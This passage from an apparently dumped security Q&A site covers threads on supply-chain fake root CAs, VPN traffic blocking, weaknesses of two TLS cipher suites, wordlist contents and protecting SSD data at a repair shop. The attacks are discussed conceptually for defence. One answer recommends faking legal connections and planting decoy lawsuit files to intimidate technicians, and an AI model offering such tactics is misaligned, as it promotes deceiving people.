<p>To explain my point, I provide this hypothetical example. Let's say that Julian Assange, while hiding in the Ecuadorian embassy, decides to buy a new Thinkpad on <code>a famous e-commerce website</code>. Now <code>famous e-commerce website</code>, like countless other American organizations, collaborates with the NSA on data sharing. The NSA learns of Assange buying a new laptop, and decides to &quot;bug&quot; that laptop with a fake root CA (and a bugged TPM). The package is delivered in brand new condition, and Assange begins to use his laptop.</p>
<p>It turns out that the Ecuadorian embassy's network was 'pwned' by the NSA long ago. Assange's network traffic was going through NSA's systems for quite a while, but the saving grace was that the traffic was at least encrypted. Now, with the fake root CA, the NSA is successfully able to mount a Man in the Middle attack, being able to see the traffic in plaintext, with perhaps the exception of PGP encrypted e-mails.</p>
<p>Even if Assange tries to download new Root Certificates to ensure being on the safe side, the traffic is intercepted by the NSA, and fake certificates are inserted.</p>
<hr />
<p>Now, you might reasonably argue that the aforementioned 3-letter-agency (and its equivalents everywhere) do not have enough funds, reasons, or legal authority to target <em>most</em> of us, but this might be a realistic scenario for many of the activists, or perhaps very lucrative targets such as data centers/companies that might end up buying a system bugged with fake root CA.</p>
<p>My question is, what are some guidelines that individuals and organizations can follow to ensure they don't become a target of such an attack?</p>
<p>Additionally, are there any books, research papers, etc, that discuss this threat model in detail?</p>
","16","5","261690","<p>What you describe is a <em>supply chain attack</em>. And it is something relatively hard to protect from.</p>
<blockquote>
<p>what are some guidelines that individuals and organizations can follow to ensure they don't become a target of such an attack?</p>
</blockquote>
<p>The easiest way to avoid being targeted is to avoid being detected as the target. So, if you were Julian Assange, don't order the computer as &quot;Julian Assange&quot;, and don't ask for it to be delivered to the Ecuadorian embassy.</p>
<p>Even better, don't order it, but go to a shop (or have someone trusted go in your place) and buy a random ThinkPad of those they have on display. If your attacker doesn't know which computer you are going to buy (or even which commerce!), they cannot bug <em>your</em> computer. They would need to bug all the computers of the shop. Moreover, someone else buying one of those could be noticeable.¹ If you are an important enough target, we can imagine even creating a fake shop just to sell a single compromised computer, but the complexity is much higher than compromising just &quot;the computer for Julian Assange&quot;.</p>
<p>Basically for the same reason, there is <a href=""https://www.businessinsider.com/trump-loves-mcdonalds-afraid-of-being-poisoned-2018-1"" rel=""noreferrer"">a story</a> that Trump likes to eat at McDonald's -among other things- to avoid being poisoned, since nobody knows he's going there, or which burger he's going to eat.</p>
<p>If you are a company or government trying to avoid this (e.g. if the Kremlin wanted to buy American computers), they would use a number of intermediaries to obscure the real buyer.</p>
<p>Moreover, companies would probably not use the preinstalled OS, but its own image (for other reasons, but actually helping with this). An end user could do the same, by installing a new OS from a <em>trusted source</em> (in fact, a compromised OS or browser could be more useful than merely a compromised CA store). Which moves the target from having a trusted software preinstalled to getting a copy of non-compromised software. If you already somehow have a trusted machine, you can use that to bootstrap (such as figuring the right fingerprints, and calculating it with a non-compromised tools).</p>
<p>If you need to install a tool with no prior toolset that can be trusted not to have been compromised. Even if you manually check fingerprints, you cannot be sure that the software that is calculating such fingerprint isn't lying to you.</p>
<p>¹ They could simply add <em>duplicate</em> CA certificates, so that innocent customers would not get certificate errors when using a network not compromised by the Agency, but it's not desirable for them that a Greenwald notices that shop X is selling compromised computers.</p>
","6"
"261607","261607","Why do some VPN block internet access?","<p>Some of the VPNs at work block internet access once you are connected. I understand if the incoming (or even outgoing) traffic from some servers are not allowed. But why all the client machines that connect to the VPN have to be blocked?</p>
<p>Which threats is it preventing from?</p>
<p>Isn't it enough just to block the internet access of the servers?</p>
","0","3","261608","<p>Any device or service in your network is a potential point of attack, and attackers are not picky at this stage. Any compromise on your network is an opportunity to explore your network, to escalate privileges up and to launch new attacks from that device, as any account on that device.</p>
<p>So you'll find privilege escalation attacks, traversal attacks, attacks on domain servers, password reuse attacks ... the list goes on.</p>
<p>So anything you can do to restrict that attack surface - disallow connections directly to the internet - helps increase the security of the organisation.</p>
","1"
"261607","261607","Why do some VPN block internet access?","<p>Some of the VPNs at work block internet access once you are connected. I understand if the incoming (or even outgoing) traffic from some servers are not allowed. But why all the client machines that connect to the VPN have to be blocked?</p>
<p>Which threats is it preventing from?</p>
<p>Isn't it enough just to block the internet access of the servers?</p>
","0","3","261617","<p>The problem is that the VPN allows the client machine to be seen as if were inside the local corporate network. There are proxies and firewalls between that internal network and the broad internet, and those proxied and firewalls are managed by the security team. If your client machines could directly access the internet while being connected to the VPN this would completely defeats any rules of the proxies and firewalls. That is enough for any member of the sec. team to suffer nightmares...</p>
<p>Worse, if the client happened to be compromissed, it would open a direct access from the outside internet into the corporate network with no control nor logging by the security team. And that would be a major breach because it would not raise any alert.</p>
<p>For that reason a normally configured corporate VPN blocks any other network access once started and trying to circumvent that would be a major attack against the internal security, and on a legal point of view a serious professional fault with all the possible associated outcomes.</p>
","1"
"261607","261607","Why do some VPN block internet access?","<p>Some of the VPNs at work block internet access once you are connected. I understand if the incoming (or even outgoing) traffic from some servers are not allowed. But why all the client machines that connect to the VPN have to be blocked?</p>
<p>Which threats is it preventing from?</p>
<p>Isn't it enough just to block the internet access of the servers?</p>
","0","3","261619","<p>Let's say a client is accessing a corporate network over VPN.</p>
<p>If all traffic is routed over the VPN, the corporation may inspect network traffic using its existing security solutions (ie. IDS/IPS). So, if the client has malware that tries to connect to a known botnet, it will be detected.</p>
<p>When you are connected to the public Internet and the corporate network at the same time you basically bridge the two together. By restricting this, even if the client is infected with a remote access trojan, the connection will be broken, and a new one may be blocked from beeing established while connected to the corporate network.</p>
<p>It is not a perfect solution in that, malware and other tools installed by an attacker on the client, may be able to operate unattended. Ie. a keylogger logs all data and is extracted by the attacker at a later stage, or some malware detects that the client is logged into some system and then starts doing damage.</p>
<p>Some conditional access policies may prevent access to SaaS solutions from outside the corporate network. IPs of SaaS solutions can change without prior notice so by routing all traffic through the corporate network you don't risk users beeing suddenly blocked from logging in to those services.</p>
<p>The opposite of forced routing over VPN is called VPN Split Tunneling. The benefit of doing this is mainly performance related. In particular a reduction of latency from the client to Internet hosted services which may be important for some applications.</p>
","0"
"261594","261594","Which cipher is more secure TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA or TLS_RSA_WITH_AES_256_GCM_SHA384?","<p>TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA supports forward secrecy but it doesn't use GCM mode and use SHA1 TLS_RSA_WITH_AES_256_GCM_SHA384 uses GCM mode and SHA2 but it doesn't support forward secrecy. Which one is more secure?</p>
","0","4","261595","<p>I agree with @schroeder, I don't think you can do a direct &quot;which is better?&quot; comparison with cipher suites.</p>
<p>That said, <a href=""https://wiki.mozilla.org/Security/Server_Side_TLS"" rel=""nofollow noreferrer"">Mozilla's TLS Recommendations</a> currently lists <code>DHE-RSA-AES256-GCM-SHA384</code> in the INTERMEDIATE list (although right at the bottom), and lists <code>ECDHE-RSA-AES256-SHA</code> in OLD.</p>
<p>So maybe that's your answer? ... neither are great, but at least according to Mozilla, <code>DHE-RSA-AES256-GCM-SHA384</code> is better.</p>
","3"
"261594","261594","Which cipher is more secure TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA or TLS_RSA_WITH_AES_256_GCM_SHA384?","<p>TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA supports forward secrecy but it doesn't use GCM mode and use SHA1 TLS_RSA_WITH_AES_256_GCM_SHA384 uses GCM mode and SHA2 but it doesn't support forward secrecy. Which one is more secure?</p>
","0","4","261596","<p>On the cmd line, try:</p>
<pre><code>$ openssl ciphers | tr ':' '\n'
</code></pre>
<p>This would give you the list of ciphers in the decreasing order of &quot;strength&quot;. This list should help you evaluate the two ciphers in your question.</p>
","1"
"261594","261594","Which cipher is more secure TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA or TLS_RSA_WITH_AES_256_GCM_SHA384?","<p>TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA supports forward secrecy but it doesn't use GCM mode and use SHA1 TLS_RSA_WITH_AES_256_GCM_SHA384 uses GCM mode and SHA2 but it doesn't support forward secrecy. Which one is more secure?</p>
","0","4","261600","<h1>Risks of CBC ciphers</h1>
<p>To attack an implementation vulnerable to variants of POODLE and Lucky13, one of the sides needs to be vulnerable (not a given, e.g. if SChannel is used on both sides it should be secure) and the attack is active, detectable in traffic analysis.</p>
<h1>Risks of RSA keyex ciphers</h1>
<p>To attack a recording of a connection made using a non-PFS cipher suite, the attacker needs to get access to the private key corresponding to the end-entity (leaf) certificate, potentially years after the certificate has expired and the disk that contained it has been disposed of. This is a safe passive attack (depending on how you get the private key).</p>
<h1>Summary</h1>
<p>Because of this, I think RSA key exchange is worse than CBC cipher suite. But really, you should avoid both - you should allow in TLS1.2 only what is allowed in TLS1.3.</p>
","1"
"261594","261594","Which cipher is more secure TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA or TLS_RSA_WITH_AES_256_GCM_SHA384?","<p>TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA supports forward secrecy but it doesn't use GCM mode and use SHA1 TLS_RSA_WITH_AES_256_GCM_SHA384 uses GCM mode and SHA2 but it doesn't support forward secrecy. Which one is more secure?</p>
","0","4","261602","<p>Neither cipher suite is good. Which one is the least bad depends on your threat model.</p>
<p><code>TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA</code> has two problems:</p>
<ul>
<li>It uses <a href=""https://en.wikipedia.org/wiki/SHA-1"" rel=""nofollow noreferrer"">SHA-1</a> to authenticate the server's signature. SHA-1 is broken for some uses: its collision resistance is broken, but not its first or second preimage resistances. An attack on collision resistance breaks <em>certificate</em> signature, but I don't think it leads to a practical exploit for <em>handshake</em> signatures, where the attacker doesn't get to choose all the data. So this is an intrinsic, but theoretical weakness.</li>
<li>It uses CBC, so it is potentially vulnerable to a <a href=""https://en.wikipedia.org/wiki/Padding_oracle_attack"" rel=""nofollow noreferrer"">padding oracle attack</a>: <a href=""https://en.wikipedia.org/wiki/Lucky_Thirteen_attack"" rel=""nofollow noreferrer"">Lucky Thirteen</a> and its variants. The original attack relied on an error message which was required in TLS 1.0 but is forbidden in TLS 1.2, so a functionally correct TLS 1.2 implementation is not vulnerable to the original attack, but it is still be vulnerable to timing-based variants unless implementated very very carefully. OpenSSL and some other major implementations of TLS are fully protected against these attacks, but less reputable implementations are not. Furthermore the protection comes at a performance cost which is paid for every packet exchanged during the connection. The attack requires somewhat precise timing which is realistic for an adversary who can run code on the same machine (as either the client or the server), possibly realistic for an attacker on a local network, but not realistic when there are multiple routers between the attacker and both parties.</li>
</ul>
<p><code>TLS_RSA_WITH_AES_256_GCM_SHA384</code> has two problems:</p>
<ul>
<li>It relies on RSA PKCS#1v1.5 decryption, so it is potentially vulnerable to a <a href=""https://en.wikipedia.org/wiki/Padding_oracle_attack"" rel=""nofollow noreferrer"">padding oracle attack</a>: <a href=""https://crypto.stackexchange.com/questions/12688/can-you-explain-bleichenbachers-cca-attack-on-pkcs1-v1-5"">Bleichenbacher's attack</a> and similar attacks (in particular Manger's attack) and variants. There has been a <a href=""https://crypto.stackexchange.com/questions/64648/the-9-lives-of-bleichenbachers-cat-it-puts-another-scratch-again/64649#64649"">long history of Bleichenbacher and Manger attacks on TLS</a>, although after CAT, <a href=""https://www.robotattack.org/"" rel=""nofollow noreferrer"">when ROBOT came out</a> OpenSSL and several other major implementations were fully protected. Protection requires very carefully written code, but does not incur a performance penalty (beyond what is required to protect RSA private key operations in general against side channels). The attack is purely on the server side, the client implementation is irrelevant.</li>
<li>It relies on RSA decryption and does not use a Diffie-Hellman key exchange, so it does not have <a href=""https://en.wikipedia.org/wiki/Forward_secrecy"" rel=""nofollow noreferrer"">forward secrecy</a>. Forward secrecy was not an objective of the original design of TLS, but it is achieved by all modern cipher suites that use (EC)DHE. Forward secrecy means that if an attacker manages to record encrypted connections (easy) and to obtain the server's private key (difficult), the attacker will be able to decrypt past encrypted connections (in addition to, obviously, being able to hijack all future connections). This attack is intrinsic to the protocol design and cannot be mitigated by an implementation: the only solution is to use a good cipher suite. However, it is not relevant to all threat models, and involves a very powerful attacker — much more powerful than a mere man-in-the-middle.</li>
</ul>
<p>If you can use both <code>TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA</code> and <code>TLS_RSA_WITH_AES_256_GCM_SHA384</code>, then you have all the cryptographic primitives needed by <code>TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384</code> and you should use that. (The <code>AES_128</code> and <code>GCM_SHA256</code> variants are also fine: the added security from having more bits there is purely theoretical.)</p>
<p>If you are in the very weird situation that only <code>TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA</code> and <code>TLS_RSA_WITH_AES_256_GCM_SHA384</code> are available, then it comes down to which attacks concern you and how good client and server implementations are. You have to choose between a potential Lucky Thirteen vulnerability (on either the client or the server), and a potential Bleichenbacher vulnerability (on the server) plus the lack of forward secrecy.</p>
","4"
"261548","261548","Why are there often random email addresses in known password word lists?","<p>In known wordlists like crackstation.lst there are random emails in the list. Why are they there?</p>
","-1","3","261552","<p>There are two main reasons:</p>
<p><strong>1. People using them for privacy</strong></p>
<p>Some people are privacy oriented, and they will create random looking email addresses for different services. This way it's not easy to link all of its personas based on the email address.</p>
<p><strong>2. They are fake and used to track leakage</strong></p>
<p>They are called <a href=""http://archives.maproomblog.com/2005/11/copyright_traps.php"" rel=""nofollow noreferrer"">Copyright Traps</a>. They are most common on maps and dictionaries, so anyone copying data from them would copy the fake streets or words too, and the owner of the data would know for sure who copied its information.</p>
<p>On leaks, sometimes the leaker will add fake emails that aren't expected to be found anywhere, and if anyone buys the data and leaks it later, the original &quot;owner&quot; of the data can know for sure who leaked the list by searching the traps on the leaked data.</p>
","2"
"261548","261548","Why are there often random email addresses in known password word lists?","<p>In known wordlists like crackstation.lst there are random emails in the list. Why are they there?</p>
","-1","3","261558","<p>Presumably it's just people using their email address as their password..</p>
","3"
"261548","261548","Why are there often random email addresses in known password word lists?","<p>In known wordlists like crackstation.lst there are random emails in the list. Why are they there?</p>
","-1","3","261562","<p>There are a few reasons (and often all three are in play):</p>
<p><strong>Larger <em>wordlists</em> are often dirty.</strong> Unless the list is specifically filtered for likely noise / &quot;junk&quot; - such as the Crackstation &quot;human&quot; variant - then a variety of other plaintexts often find their way into lists, simply because people are shoveling a large variety of data into their wordlists.</p>
<p><strong>Larger <em>hashlists</em> are often dirty.</strong> Uncracked hashes that are submitted via a public interface or API are often taken from a variety of sources, including hashes of email addresses that are used - naively, or deliberately - as unique, normalized, semi-obfuscated tokens for a given platform. For example, Gravatar deliberately uses hashes of email addresses in URLs. An attacker who  knows this will then try all sorts of common usernames and email domains, and crack many of them. This makes them end up in wordlists.</p>
<p><strong>Some people literally use email addresses as their passwords</strong>. This is because they're easy to remember, and users (naively) think that someone might not guess that they're using their alternate email, or even someone else's email, as their password.</p>
","4"
"261416","261416","Need to leave computer in repair shop. How can I secure solid state drive contents?","<p>I need to take my desktop into a PC repair shop and leave it for a few days. It would be easy for them to copy the drives without me knowing. I am running Windows 10 with a password but this doesn't actually encrypt the drive. I have multiple SSDs in the PC. I considered just taking the SSDs out but this isn't a good idea because I want them to fix cabling issues (someone told me installing a new power supply is easy but I disagree).</p>
<p>I thought about encrypting sensitive files and encrypting them with Veracrypt but this doesn't seem to be a great idea. I would have to:</p>
<p>        a) find each file;<br />
        b) encrypt it and then decrypt to use;<br />
        c) securely wipe the unencrypted file.</p>
<p>Is there a better option?</p>
","20","9","261420","<p><em>Swapping</em> the SSDs for blank (or at least empty of anything-you-care-about) ones would work, though of course then you'd have to swap them back afterward and that has some potential to mess up the cabling (depends on your case). It also requires some SSD(s) you don't care about.</p>
<p>Actually encrypting the drive is a good option. You can use Bitlocker (the Windows built-in disk encryption feature), though depending on your hardware and your Windows edition you might need to upgrade some stuff and/or change some settings to make this work (by default, Bitlocker wants a TPM, and I'm not sure if it's available on Home editions or not). <a href=""https://support.microsoft.com/en-us/windows/device-encryption-in-windows-ad5dcf4b-dbe0-2331-228f-7925c2a3012d"" rel=""noreferrer"">You <em>might</em> be able to use &quot;Device Encryption&quot; even on Windows 10 Home</a>; this is just BitLocker under the covers, but with less user control over its behavior (and in particular, it does require TPM 2.0, which many but not all modern machines have built into their CPUs). Alternatively you can use a third-party encryption utility. Veracrypt (among others) is able to perform full-volume encryption (same as Bitlocker) such that the OS and data are inaccessible without a password or USB key. In either case, the shop would still be able to turn the computer on, though not to get very far; they'd be stopped at or before the Windows login screen. However, all the data (not just specific files) on the disks would be encrypted at rest.</p>
<p>Finally, depending on the shop and the machine in question, you could remove the SSDs while whatever else gets fixed, and then bring them with you and ask the technician to install them while you watch. Installing SSDs takes very little time in most cases, especially for a trained and experienced technician, and can be done without ever letting the SSDs or machine out of your sight. Of course, if the SSDs are SATA and the shop doesn't know you're going to install a bunch of SATA SSDs, they might not run the power and data cables where you'll need them, which might slightly increase the time to install them. Not by much, though. Replacing the PSU on most cases really is quite easy, with cable management being the only tricky part at all and still not that hard (unless your case layout is really inconvenient or the cables are too short, which sometimes happens).</p>
","25"
"261416","261416","Need to leave computer in repair shop. How can I secure solid state drive contents?","<p>I need to take my desktop into a PC repair shop and leave it for a few days. It would be easy for them to copy the drives without me knowing. I am running Windows 10 with a password but this doesn't actually encrypt the drive. I have multiple SSDs in the PC. I considered just taking the SSDs out but this isn't a good idea because I want them to fix cabling issues (someone told me installing a new power supply is easy but I disagree).</p>
<p>I thought about encrypting sensitive files and encrypting them with Veracrypt but this doesn't seem to be a great idea. I would have to:</p>
<p>        a) find each file;<br />
        b) encrypt it and then decrypt to use;<br />
        c) securely wipe the unencrypted file.</p>
<p>Is there a better option?</p>
","20","9","261442","<blockquote>
<p>I have multiple SSDs in the PC.</p>
</blockquote>
<p>Cool, take a picture and print it.</p>
<hr />
<blockquote>
<p>I considered just taking the SSDs out</p>
</blockquote>
<p>Yes, do this.</p>
<p>If you're afraid of breaking something then have the technician remove them and give them to you to bring home.</p>
<p>When you go to pick up your computer then just bring your drives and they will re-install them.</p>
<hr />
<blockquote>
<p>but this isn't a good idea because I want them to fix cabling issues</p>
</blockquote>
<p>If the technician has a picture of where your SSDs are then it's trivial to pre-route the cables to those locations.</p>
<hr />
<blockquote>
<p>someone told me installing a new power supply is easy but I disagree</p>
</blockquote>
<p>Yes, it really is trivial; for a technician. Your disagreement is unfounded.</p>
<hr />
<p>It really depends on what's being fixed.</p>
<p>If you have a fierce virus or a corrupt Windows 10 installation then you kind of have to trust them to be professional. If you have sensitive stuff and don't want them freely snooping around then back up your stuff, delete it from your drives, and run trim a few times. You're very unlikely to be a worthwhile target for a data recovery procedure.</p>
<p>If you're having a hardware issue and nothing happens when you press the power button then just take out the drives. If the technician gets to a point where they boot into the BIOS then your problem is resolved as far as they're concerned.</p>
<p>If a motherboard replacement is required then you will likely need to re-install Windows from scratch and bring your files over. I would imagine they would coordinate such an endeavor with you.</p>
","6"
"261416","261416","Need to leave computer in repair shop. How can I secure solid state drive contents?","<p>I need to take my desktop into a PC repair shop and leave it for a few days. It would be easy for them to copy the drives without me knowing. I am running Windows 10 with a password but this doesn't actually encrypt the drive. I have multiple SSDs in the PC. I considered just taking the SSDs out but this isn't a good idea because I want them to fix cabling issues (someone told me installing a new power supply is easy but I disagree).</p>
<p>I thought about encrypting sensitive files and encrypting them with Veracrypt but this doesn't seem to be a great idea. I would have to:</p>
<p>        a) find each file;<br />
        b) encrypt it and then decrypt to use;<br />
        c) securely wipe the unencrypted file.</p>
<p>Is there a better option?</p>
","20","9","261443","<p>For the most part, you can't. If you want to be able to trust that your computer hasn't been tampered with, it needs to remain in your physical custody. I know someone told you this before and you disagreed with it, but replacing the power supply in a PC case is really no harder than replacing the surge protector strip under your desk; it's just a matter of unplugging and replugging cables (albeit with different plug types on them). As long as you take good notes/pictures of what goes where, you can't really mess it up. If you have concerns about the safety of your data handing the computer over to a shop, I <em>really, cannot recommend strongly enough</em>, figuring out how to do this yourself and avoiding the issue entirely.</p>
<p>If you do really need a shop to work on your computer, like if it's something more difficult you can't do yourself, take the drives out or at least use full disk encryption with the key not stored anywhere on the PC, but derived from a password you have to enter at boot time. I believe this can be done with Bitlocker on stock Windows these days but I'm not a Windows expert by any means so look to other answers for <em>how</em> to do that. Of course this will do nothing to mitigate the possibility of keyloggers or firmware-level malware that might be installed (with or without the shop's knowledge; it's possible their systems are infected by somebody else's malware) while they have your PC.</p>
<p>File-level encryption will help if your only concern is reading/copying certain sensitive data, but it will do nothing to prevent installation of backdoors/spyware that would let someone take your data the next time you use the computer, or (more likely) not-intentionally-malicious but harmful changes to your PC done by an incompetent and/or irresponsible technician during the time they have it.</p>
","15"
"261416","261416","Need to leave computer in repair shop. How can I secure solid state drive contents?","<p>I need to take my desktop into a PC repair shop and leave it for a few days. It would be easy for them to copy the drives without me knowing. I am running Windows 10 with a password but this doesn't actually encrypt the drive. I have multiple SSDs in the PC. I considered just taking the SSDs out but this isn't a good idea because I want them to fix cabling issues (someone told me installing a new power supply is easy but I disagree).</p>
<p>I thought about encrypting sensitive files and encrypting them with Veracrypt but this doesn't seem to be a great idea. I would have to:</p>
<p>        a) find each file;<br />
        b) encrypt it and then decrypt to use;<br />
        c) securely wipe the unencrypted file.</p>
<p>Is there a better option?</p>
","20","9","261447","<p>I work at a computer repair place.</p>
<p>It would really help if you told us what kind of work you're having done on it. You mentioned replacing the power supply; is that <em>all</em> that's being done? Because, yes, replacing a power supply really is super easy. At my shop, if someone buys the power supply from us, we'll install it for free, right in front of the customer. Unless they have something weird going on, it shouldn't take more than 10 minutes (and that includes the time it takes to remove the old PS).</p>
<p>If there's any other work that needs to be done, the answer will really depend on the nature of that work. Removing the drives or encrypting them are the best options in this scenario, but that might not be possible if the tech needs to access the drive as part of the repair (for instance, installing drivers or removing viruses). In that case, you'll need to either back the files up to a flash drive and delete them, or use file-level encryption.</p>
<p>(If you do remove the drives yourself, make <strong>absolutely</strong> sure that you tell the tech that you did this.)</p>
<p>The answer also depends somewhat on the nature of the data you want to protect:</p>
<ul>
<li><p>Are you worried about them stealing your online banking data? Log out of your online bank(s), clear all browsing data, copy any password documents to a flash drive and delete them from the computer, then (if you want to be really sure) use a program to zero out the free space on the drive. (Note: If you do have passwords saved in a document somewhere, they really should be put in an encrypted password safe app <em>anyway</em>, so this might be a good opportunity to do so.)</p>
</li>
<li><p>Are you writing a novel/screenplay/video game/D&amp;D campaign that you don't want to leak? All those files should be grouped together, so it should be fairly simple to encrypt them or copy them to a flash drive, then securely erased.</p>
</li>
<li><p>Do you have confidential customer information from your employer? That might be a little more complicated, but, again, your options are encryption or moving them to a flash drive. (Then again, if you're using your computer for work, you might be able to get your company's IT department to help you instead of taking it to a shop, so you don't have to worry about leaking confidential info in the first place.)</p>
</li>
<li><p>Is it just your collection of furry midget porn? I wouldn't even worry about that, because, trust me, <em>they've seen worse</em>. (Though it would be polite to warn the tech about stuff like that, lest they unexpectedly get an eyeful of something they <em>really</em> didn't want to see.)</p>
</li>
</ul>
","11"
"261416","261416","Need to leave computer in repair shop. How can I secure solid state drive contents?","<p>I need to take my desktop into a PC repair shop and leave it for a few days. It would be easy for them to copy the drives without me knowing. I am running Windows 10 with a password but this doesn't actually encrypt the drive. I have multiple SSDs in the PC. I considered just taking the SSDs out but this isn't a good idea because I want them to fix cabling issues (someone told me installing a new power supply is easy but I disagree).</p>
<p>I thought about encrypting sensitive files and encrypting them with Veracrypt but this doesn't seem to be a great idea. I would have to:</p>
<p>        a) find each file;<br />
        b) encrypt it and then decrypt to use;<br />
        c) securely wipe the unencrypted file.</p>
<p>Is there a better option?</p>
","20","9","261453","<p>Take out the SSD hard drive then go get another SSD hard drive that is the same as that one and put that in the spot where your ''sensitive'' SSD is then let them install the power supply when you get it back swap out the blank SSD that you had with your ''sensitive'' one</p>
<p>This allows them to run all the cables exactly where you need them to run it and the drive is not ever in their possession so if it's that important spend a little extra cash</p>
","1"
"261416","261416","Need to leave computer in repair shop. How can I secure solid state drive contents?","<p>I need to take my desktop into a PC repair shop and leave it for a few days. It would be easy for them to copy the drives without me knowing. I am running Windows 10 with a password but this doesn't actually encrypt the drive. I have multiple SSDs in the PC. I considered just taking the SSDs out but this isn't a good idea because I want them to fix cabling issues (someone told me installing a new power supply is easy but I disagree).</p>
<p>I thought about encrypting sensitive files and encrypting them with Veracrypt but this doesn't seem to be a great idea. I would have to:</p>
<p>        a) find each file;<br />
        b) encrypt it and then decrypt to use;<br />
        c) securely wipe the unencrypted file.</p>
<p>Is there a better option?</p>
","20","9","261460","<p>One approach is to use a bootable USB drive to erase everything on the SSDs and hard drive. Then erase free space on those devices using something like <code>cipher.exe /w</code> for a HDD or an SSD-specific tool that accounts for wear-levelling.</p>
<p>You could maybe install some bootable OS on the HDD for testing.</p>
<p>Then take the computer to the repair shop.</p>
<p>When you get it back, wipe it again and restore Windows and your apps and data from any of your regular backups. (As the first step in this plan, you might want to test a few of your onsite and offsite backups if you haven't done so recently)</p>
","4"
"261416","261416","Need to leave computer in repair shop. How can I secure solid state drive contents?","<p>I need to take my desktop into a PC repair shop and leave it for a few days. It would be easy for them to copy the drives without me knowing. I am running Windows 10 with a password but this doesn't actually encrypt the drive. I have multiple SSDs in the PC. I considered just taking the SSDs out but this isn't a good idea because I want them to fix cabling issues (someone told me installing a new power supply is easy but I disagree).</p>
<p>I thought about encrypting sensitive files and encrypting them with Veracrypt but this doesn't seem to be a great idea. I would have to:</p>
<p>        a) find each file;<br />
        b) encrypt it and then decrypt to use;<br />
        c) securely wipe the unencrypted file.</p>
<p>Is there a better option?</p>
","20","9","261462","<p>If there is one important thing that could be learnt from reading stories written by employees and owners of computer repair shops, it is that such shops cannot and should not be trusted because a fraction of people working in such places are more than happy to eagerly analyze the entire contents of their client's file system, even if such analysis is not in any way required to solve the issue they are being paid to fix. I am not denying the fact that there are a lot of honourable and professional people working in such places who respect computer's owner right to privacy, but we still need to remember that the number of people who could be described as the opposite is greater than zero. Even if such people make as little as 1% of all the employees, it is still a great concern. Such people will feel absolutely no shame whatsoever while rummaging through your private files, for reason no other than that they technically (but not morally) can, and will potentially publicly upload, let's say, your photos to the Web anything that could in their eyes make a &quot;funny&quot; juvenile Internet &quot;meme&quot; of the <em>&quot;super embarrassing private thing found in client's PC!&quot;</em> flavour.</p>
<p>Only sensible solution is, never leave your HDDs/SSDs together with your PC. If your PC has CD/DVD optical drive, set the BIOS to boot from it. Obtain a <a href=""https://en.wikipedia.org/wiki/Live_CD"" rel=""nofollow noreferrer"">Live CD</a>, on which a portable version of operating system of your choice is burnt. Before leaving the PC in repair shop, remove all HDDs/SSDs and instead put the said Live CD inside the drive. Live USB stick could be used instead, but it won't have the advantage of being read-only as CD/DVD.</p>
<p>Good thing to do, regardless if you want to do according to my aforementioned advice or not, is to make a subtle and implicit but unambiguous impression that you were a lawyer or otherwise professionally involved with occupations that suggest having a significant legal muscle. Practicing law without the license is illegal, but dressing like a lawyer and using lawyer slang is not, as long as you do not officially and explicitly claim that your are a lawyer while not being a lawyer. Any subtle suggestions of having family or friends employed in state's administrative occupation, like an embassy, would also certainly discourage any bottom-feeding wannabe digital sniffers from messing with you from their fear of being sued. The mentioned impression and suggestions could be both in the form of your clothing and appearance while you are visiting the shop and interacting with employees, and in the form of suggestive files with appropriately intimidating contents, like <em>&quot;nondisclosure_breach_lawsuit_2.docx&quot;</em> innocently and seemingly accidentally left in plain sight on your PC's desktop. In general, figuratively speaking, just make sure to subtly flex your legal muscle in front of the repair shop crew, whether that muscle is real or non-existent, to make a proper impression and indirectly telegraph that messing with your privacy will have consequences.</p>
<p>Good luck!</p>
","0"
"261416","261416","Need to leave computer in repair shop. How can I secure solid state drive contents?","<p>I need to take my desktop into a PC repair shop and leave it for a few days. It would be easy for them to copy the drives without me knowing. I am running Windows 10 with a password but this doesn't actually encrypt the drive. I have multiple SSDs in the PC. I considered just taking the SSDs out but this isn't a good idea because I want them to fix cabling issues (someone told me installing a new power supply is easy but I disagree).</p>
<p>I thought about encrypting sensitive files and encrypting them with Veracrypt but this doesn't seem to be a great idea. I would have to:</p>
<p>        a) find each file;<br />
        b) encrypt it and then decrypt to use;<br />
        c) securely wipe the unencrypted file.</p>
<p>Is there a better option?</p>
","20","9","261464","<p>You might be able to set an <a href=""https://en.wikipedia.org/wiki/Parallel_ATA#HDD_passwords_and_security"" rel=""nofollow noreferrer"">ATA password</a> for the SSD(s). I believe that most desktop UEFI/BIOS firmware implementations do not have an option to do that (laptops generally do), but you might be able to find a tool that can run from a USB boot drive to set that password. The <code>hdparm</code> tool of any Live USB Linux distribution would be able to do that, for example.</p>
<p>Please note that in general this will only password-protect the drive, it will not actually encrypt the data. A really determined attacker (like certain 3-letter agencies) would still be able to bypass the lockout [1], but I would not expect the average computer tech to spend that kind of effort.</p>
<p>The advantage of this option is that you don't need any kind of OS support - the data on the drive is basically unmodified. Once you get your PC back, you remove the password and all is as before.</p>
<p>The obvious disadvantage is that if something goes wrong, you lose your data. So, backing up your data is crucial - as it would be even if you were not playing with drive passwords.</p>
<hr />
<p>[1] Generally, bypassing the lockout would require modifying the drive electronics physically, or updating it to a custom firmware version that skips the password check. Not impossible - far from it - but not totally trivial either.</p>
","3"
"261416","261416","Need to leave computer in repair shop. How can I secure solid state drive contents?","<p>I need to take my desktop into a PC repair shop and leave it for a few days. It would be easy for them to copy the drives without me knowing. I am running Windows 10 with a password but this doesn't actually encrypt the drive. I have multiple SSDs in the PC. I considered just taking the SSDs out but this isn't a good idea because I want them to fix cabling issues (someone told me installing a new power supply is easy but I disagree).</p>
<p>I thought about encrypting sensitive files and encrypting them with Veracrypt but this doesn't seem to be a great idea. I would have to:</p>
<p>        a) find each file;<br />
        b) encrypt it and then decrypt to use;<br />
        c) securely wipe the unencrypted file.</p>
<p>Is there a better option?</p>
